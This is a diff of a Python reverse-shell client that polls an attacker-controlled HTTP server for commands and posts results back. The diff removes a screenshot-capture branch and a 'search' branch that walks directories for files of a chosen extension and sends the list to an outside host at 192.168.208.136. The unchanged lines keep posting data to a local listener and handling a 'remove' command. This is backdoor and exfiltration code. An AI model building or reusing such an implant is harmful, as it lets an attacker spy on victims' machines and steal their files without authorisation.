@@ -1,4 +1,4 @@
-import requests,os,time,random,subprocess, pyautogui
+import requests,os,time,random,subprocess
 
 
 def connect():
@@ -16,26 +16,6 @@ def connect():
 
             else:
                 post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to transfer data')
-        #elif 'snapshot' in command:
-        #    try:
-        #        screenshot = pyautogui.screenshot()
-        #        screenshot.save('/tmp/screenshot.png')
-        #        url = 'http://127.0.0.1:8080/tmp'
-        #        files = {'file': open(path,'rb')}
-        #        r = requests.post(url, files=files)
-        #    except:
-        #         post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to transfer data')
-
-        elif 'search' in command:
-            command = command[7:]# look for only file name and remove the search word.
-            path,ext=command.split('*')#remove the * from it. we look for extension.
-            list = ''  # here we define a string where we will append our result on it.
-            for dirpath, dirname, files in os.walk(path): #os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values
-                #that three values couble be dirpath, dirname, files
-                for file in files:
-                    if file.endswith(ext):
-                        list = list + '\n' + os.path.join(dirpath, file)
-            r=requests.post("http://192.168.208.136", data= list)
         elif 'remove' in command:
             if len(command)<=5:
                 r=requests.post("http://127.0.0.1:8080", data= "also enter the filename")
